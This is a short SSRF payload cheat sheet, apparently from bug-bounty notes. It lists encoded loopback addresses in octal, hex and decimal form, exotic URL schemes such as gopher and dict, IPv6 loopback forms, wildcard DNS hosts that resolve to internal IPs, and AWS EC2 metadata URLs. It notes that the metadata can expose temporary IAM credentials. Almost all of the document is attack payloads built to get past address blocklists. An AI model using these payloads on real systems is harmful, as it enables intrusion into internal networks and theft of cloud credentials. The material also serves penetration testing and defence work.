## SSRF

**How to SSRF by Jobert Abma

https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF

```
http://0177.1/
```

```
http://0x7f.1/
```

```
https://520968996
```

_Note:_ The latter can be calculated using http://www.subnetmask.info/


**IP-Obfuscator**
Often come handy when backend application is using some sort of black-listing approach to block private address

https://github.com/C-REMO/Obscure-IP-Obfuscator



**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
```

```
http://[::]
```

**Wildcard DNS**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```
_Link:_ http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Link:_ http://nip.io

**AWS EC2 Metadata**

```
http://169.254.169.254/latest/meta-data/  
```

```
http://169.254.169.254/latest/meta-data/local-hostname
```

```
http://169.254.169.254/latest/meta-data/public-hostname
```

> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role [...]

_Link:_ http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html (includes a comprehensive Instance Metadata Categories table)
